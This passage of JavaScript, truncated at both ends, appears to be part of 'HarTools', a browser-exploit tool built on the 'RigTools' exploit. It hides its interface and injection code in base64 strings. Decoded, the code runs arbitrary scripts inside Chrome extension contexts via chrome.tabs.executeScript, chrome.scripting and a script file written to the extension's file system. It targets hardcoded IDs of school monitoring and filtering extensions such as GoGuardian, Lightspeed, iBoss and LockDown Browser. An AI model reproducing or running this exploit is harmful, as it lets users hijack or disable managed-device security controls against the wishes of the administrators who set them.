1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgdGV4dEJveC50ZXh0Q29udGVudCA9ICJcIkkgbWFkZSBteSBvd24gb2lsIHJpZ2dpbmcgc3RvY2sgbWFya2V0IHRvb2xzLlwiIjsKICAgICAgICB0ZXh0Qm94LmNsYXNzTmFtZSA9ICJwcmFoaXQtdGV4dGJveCI7CgogICAgICAgIGNvbnRhaW5lci5hcHBlbmRDaGlsZChvdmVybGF5SW1hZ2UpOwogICAgICAgIGNvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0Qm94KTsKCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250YWluZXIpOwoKICAgICAgICBjb25zdCBzbm93Zmxha2VzRGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgc25vd2ZsYWtlc0Rpdi5jbGFzc05hbWUgPSAic25vd2ZsYWtlcyI7CiAgICAgICAgc25vd2ZsYWtlc0Rpdi5zZXRBdHRyaWJ1dGUoImFyaWEtaGlkZGVuIiwgInRydWUiKTsKCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCAxNDsgaSsrKSB7CiAgICAgICAgICAgIGNvbnN0IHNub3dmbGFrZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgICAgICBzbm93Zmxha2UuY2xhc3NOYW1lID0gInNub3dmbGFrZSI7CgogICAgICAgICAgICBjb25zdCBzbm93Zmxha2VJbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgICAgICBzbm93Zmxha2VJbWFnZS53aWR0aCA9IDMwOwogICAgICAgICAgICBzbm93Zmxha2VJbWFnZS5zcmMgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL3ByYWhpdC5wbmciOwogICAgICAgICAgICBzbm93Zmxha2UuYXBwZW5kQ2hpbGQoc25vd2ZsYWtlSW1hZ2UpOwoKICAgICAgICAgICAgc25vd2ZsYWtlc0Rpdi5hcHBlbmRDaGlsZChzbm93Zmxha2UpOwogICAgICAgIH0KCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzbm93Zmxha2VzRGl2KTsKCiAgICAgICAgY29uc3QgZXhwbG9zaW9uSW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgICAgICBleHBsb3Npb25JbWFnZS5zcmMgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2Jvb20uYXdlYnAiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS50b3AgPSAiMCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUubGVmdCA9ICIwIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5oZWlnaHQgPSAiMTAwJSI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuekluZGV4ID0gIjk5OTkiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChleHBsb3Npb25JbWFnZSk7CgogICAgICAgIGNvbnN0IGV4cGxvZGUgPSBuZXcgQXVkaW8oImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9ib29tLm1wMyIpOwoKICAgICAgICBjb25zdCBjYXRzTXVzaWMgPSBuZXcgQXVkaW8oImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9jYXRzLm1wMyIpOwogICAgICAgIGNhdHNNdXNpYy5sb29wID0gdHJ1ZTsKCiAgICAgICAgZnVuY3Rpb24gc2hvd0V4cGxvc2lvbkFuZFBsYXlNdXNpYygpIHsKCiAgICAgICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOwoKICAgICAgICAgICAgZXhwbG9kZS5wbGF5KCk7CiAgICAgICAgICAgIGNhdHNNdXNpYy5wbGF5KCk7CgogICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAgICAgfSwgMTUwMCk7CgogICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgZXhwbG9kZS5wYXVzZSgpOwogICAgICAgICAgICAgICAgZXhwbG9kZS5jdXJyZW50VGltZSA9IDA7CiAgICAgICAgICAgIH0sIDE1MDApOwogICAgICAgIH0KCiAgICAgICAgc2hvd0V4cGxvc2lvbkFuZFBsYXlNdXNpYygpOwoKICAgICAgICByZXR1cm47CiAgICB9CgogICAgaWYgKG9uVGFiKSB7CiAgICAgICAgY29kZSA9IGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQgPwogICAgICAgICAgICBgO2Nocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQoCiAgICAgICAgICAke3RhYklkfSwKICAgICAgICAgIHsgY29kZTogJHtKU09OLnN0cmluZ2lmeShjb2RlKX0gfQogICAgICAgIClgIDoKICAgICAgICAgICAgY2hyb21lLnNjcmlwdGluZyA/CiAgICAgICAgICAgIGBjaHJvbWUuc2NyaXB0aW5nLmV4ZWN1dGVTY3JpcHQoewogICAgICAgICAgdGFyZ2V0OiB7dGFiSWQ6ICR7dGFiSWR9fSwKICAgICAgICAgIGZ1bmM6ICgpID0+IHske2NvZGV9fQogICAgICAgIH0pO2AgOgogICAgICAgICAgICBgYWxlcnQoInNvbWV0aGluZyB3ZW50IHdyb25nLCBydW5Db2RlIHdhcyBleGVjdXRlZCBvbiBhIHRhYiB3aXRob3V0IHByb3BlciBwZXJtaXNzaW9ucyIpYDsKICAgIH0KCiAgICB0cnkgewogICAgICAgIGNvbnN0IG9yaWdpbmFsTG9nID0gY29uc29sZS5sb2c7CiAgICAgICAgY29uc29sZS5sb2cgPSAoLi4uYXJncykgPT4gewogICAgICAgICAgICBvdXRwdXREaXYuaW5uZXJIVE1MICs9IGFyZ3Muam9pbigiICIpICsgIjxicj4iOwogICAgICAgIH07CgogICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwoKICAgICAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsKICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci5vbndyaXRlZW5kID0gcmVzb2x2ZS5iaW5kKG51bGwsIGVudHJ5LnRvVVJMKCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgY29uc3QgdXJsID0gYXdhaXQgd3JpdGVGaWxlKCJzcmMuanMiLCBjb2RlKTsKICAgICAgICBsZXQgc2NyaXB0ID0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXZhbHVhdGVfZWxlbSIpID8/CiAgICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5yZW1vdmUoKTsKICAgICAgICBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICAgICAgc2NyaXB0LnNyYyA9IHVybDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CgogICAgICAgIGNvbnNvbGUubG9nID0gb3JpZ2luYWxMb2c7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIG91dHB1dERpdi5pbm5lckhUTUwgPSBgRXJyb3I6ICR7ZXJyb3J9YDsKICAgIH0KfTs=`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4=')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkhhclRvb2xzPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBpZnJhbWUgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgd2lkdGg6IDA7CiAgICAgICAgaGVpZ2h0OiAwOwogICAgICB9CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KCiAgICAgIGEgewogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMWQxZDFkOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIG1heC1oZWlnaHQ6IDkwdmg7CiAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsKICAgICAgICB3aWR0aDogNzUlOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiAzLjVlbTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgfQoKICAgICAgLnRpdGxlLXRleHQgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMi4yZW07CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBtYXJnaW46IDVweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICB9CgogICAgICAuYnV0dG9uOmZvY3VzIHsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICBpbnB1dCwKICAgICAgc2VsZWN0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzEyMTIxMjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICB9CgogICAgICBpbnB1dDpmb2N1cywKICAgICAgc2VsZWN0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICBib3JkZXItY29sb3I6ICNhODEyZmY7CiAgICAgIH0KCiAgICAgIDo6cGxhY2Vob2xkZXIgewogICAgICAgIGNvbG9yOiAjYmJiOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS10ZXh0Ij4KICAgICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPk9yaWdpbmFsIFJpZ1Rvb2xzIEV4cGxvaXQgd2FzIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT48L3A+CiAgICAgIDxocj4KICAgICAgPHA+QUtBOiBpZiBzb21lb25lIHRlbGxzIHlvdSB0aGF0IHRoZXkgbWFkZSB0aGlzLCB0aGV5J3JlIGx5aW5nIGFuZCB5b3Ugc2hvdWxkIGxhdWdoIGF0IHRoZW08L3A+CiAgICAgIDxocj4KICAgICAgPHA+QWRkaXRpb25hbCBjcmVkaXRzOiBEaXNjb3JkOiBAYXhxbXggKHRlc3RpbmcgYW5kIGhlbHBpbmcgd2l0aCBkZXZlbG9wbWVudCkgQHB3ZW4gKGlkZWFzKSB8IEdpdGh1YjogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiAob3JpZ2luYWwgcmlndG9vbHMgZXhwbG9pdCkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+ICh0ZXN0aW5nIGFuZCBkZXZlbG9wbWVudCk8L3A+CiAgICAgIDxocj4KCiAgICAgIDxwPlByZXNzIFEgZm9yIGV2YWx1YXRpbmcgY29kZSB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZXh0ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmV4dGVuc2lvbiBpZDwvYT48L3A+CiAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgPHA+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGFsZXJ0PC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdvZ3VhcmRpYW48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttZmZlaGJpZGxhbGliZmVrbGFlZm5ja3BpZGJvZGZmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmlib3NzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1sb2FqZm5tamNrZmpiZWVvZmNkYWVjYmVsbmJsZGVuIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnNuYXAmcmVhZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttcGpsaWxuZW1qY2lvaGpja2phZG1nbWljb2xkZ2xmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmR5a25vdyBjbG91ZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJnbmRtaGRjZWZiaGxjaGtoaXBjbm5ia2NtaWNuY2VoayIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nZm9ybXMgbG9ja2VkIG1vZGUgKGVucm9sbGVkIGNicyk8L2E+CiAgICAgIDwvcD4KCiAgICAgIDxwPlByZXNzIE0gZm9yIGV2YWx1YXRpbmcgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImRldmRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5kZXZ0b29sczwvYT4gY29udGV4dDwvcD4KICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJkZXZ0b29sczovL2RldnRvb2xzL2J1bmRsZWQvZGV2dG9vbHNfYXBwLmh0bWw/ZXhwZXJpbWVudHM9dHJ1ZSZ3cz0lJXVwZGF0ZXJ1cmwlJSI+UmUtb3BlbiBkZXZ0b29sczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idXBkYXRlciI+VXBkYXRlIHBheWxvYWQ8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlIj5DaHJvbWUgVVJMczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUyIj5DaHJvbWUgVVJMcyAyPC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gInEiKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXh0ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIm0iKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGV2ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICBjb25zb2xlLmxvZyhldmVudC5rZXkpOwogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgcCAuaGFyZGNvZGVkOm50aC1jaGlsZCg